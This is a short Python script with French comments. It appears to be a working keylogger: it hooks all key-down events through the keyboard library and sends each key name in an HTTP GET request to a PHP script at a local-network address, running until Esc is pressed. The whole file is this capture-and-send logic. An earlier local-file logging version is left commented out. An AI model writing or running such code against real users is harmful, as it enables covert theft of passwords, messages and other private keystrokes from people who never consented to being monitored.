import keyboard
import requests
from urllib.parse import quote

php_script_url = "http://192.168.0.13/index.php"

def on_key_event(e):

    # Obtient le type de l'événement (appui ou relâchement de la touche)
    if e.event_type == keyboard.KEY_DOWN:
        
        # Crée une chaîne de caractères avec les informations de la touche
        # key_info = f"{e.name}, {event_type}\n"
        key_info = f"{e.name} "


        # Écrit la chaîne de caractères dans un fichier texte
        # with open('enregistrement_touches.txt', 'a', encoding='utf-8') as file:
        #     file.write(key_info)

        key_info_encoded = quote(key_info)
        
        # encode in UTF 8
        url_with_params = f"{php_script_url}?key_info={key_info_encoded}"


        response = requests.get(url_with_params)

        # print(response.text)
        


# Enregistre la fonction de rappel pour tous les événements de touche
keyboard.hook(on_key_event)

# Maintient le programme en cours d'exécution
keyboard.wait("esc")  # Arrête le programme en appuyant sur la touche "Esc"